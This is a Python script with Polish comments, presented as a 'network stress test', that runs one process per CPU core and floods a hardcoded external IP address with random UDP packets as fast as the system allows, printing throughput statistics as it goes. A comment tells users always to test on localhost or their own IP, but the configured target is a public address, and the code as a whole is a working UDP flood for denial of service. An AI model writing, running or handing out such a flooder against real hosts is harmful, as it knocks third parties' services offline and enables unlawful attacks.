import socket
import multiprocessing
import os
import time

# --- KONFIGURACJA TESTOWA ---
TARGET_IP = "156.206.32.13"  # ZAWSZE testuj na localhost lub własnym IP!
TARGET_PORT = 16000
PROCESS_COUNT = os.cpu_count()  # Dopasowanie do liczby rdzeni procesora
PAYLOAD_SIZE = 1350


def stress_test_worker(target_ip, target_port, stop_event, shared_stats):
    """Pracownik zoptymalizowany pod kątem minimalnego narzutu CPU."""
    # Tworzymy payload raz - generowanie losowych danych w pętli zabija wydajność
    payload = os.urandom(PAYLOAD_SIZE)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    # Próba zwiększenia bufora systemowego
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    except:
        pass

    local_p_count = 0

    while not stop_event.is_set():
        try:
            # Bardzo ciasna pętla - wysyłamy 500 pakietów przed aktualizacją statystyk
            for _ in range(500):
                sock.sendto(payload, (target_ip, target_port))
                local_p_count += 1

            # Aktualizacja statystyk zbiorczych (rzadsza = szybszy skrypt)
            with shared_stats.get_lock():
                shared_stats.value += local_p_count
            local_p_count = 0

        except (BlockingIOError, OSError):
            # Bufor systemowy pełny - krótkie zwolnienie, by karta sieciowa "odetchnęła"
            time.sleep(0.001)
        except Exception:
            break
    sock.close()


def monitor(shared_stats, stop_event):
    """Logika monitorująca wydajność w czasie rzeczywistym."""
    last_count = 0
    start_time = time.time()

    while not stop_event.is_set():
        time.sleep(1)
        with shared_stats.get_lock():
            current_total = shared_stats.value

        pps = current_total - last_count
        mbps = (pps * PAYLOAD_SIZE * 8) / 1_000_000
        last_count = current_total

        os.system("cls" if os.name == "nt" else "clear")
        print(f"--- NETWORK STRESS TEST | TARGET: {TARGET_IP} ---")
        print(f"Prędkość: {mbps:.2f} Mbps")
        print(f"Pakiety na sekundę (PPS): {pps:,}")
        print(f"Łącznie wysłano: {current_total * PAYLOAD_SIZE / (1024*1024):.2f} MB")
        print("Naciśnij Ctrl+C, aby przerwać test.")


if __name__ == "__main__":
    # Używamy jednego licznika dla pakietów (bajty obliczymy z rozmiaru)
    total_packets = multiprocessing.Value(
        "Q", 0
    )  # 'Q' dla dużych liczb (unsigned long long)
    stop_event = multiprocessing.Event()

    print(f"Uruchamianie {PROCESS_COUNT} procesów testowych...")
    workers = []
    for _ in range(PROCESS_COUNT):
        p = multiprocessing.Process(
            target=stress_test_worker,
            args=(TARGET_IP, TARGET_PORT, stop_event, total_packets),
        )
        p.daemon = True
        p.start()
        workers.append(p)

    try:
        monitor(total_packets, stop_event)
    except KeyboardInterrupt:
        print("\n[!] Test przerwany przez użytkownika.")
    finally:
        stop_event.set()
        for w in workers:
            w.terminate()
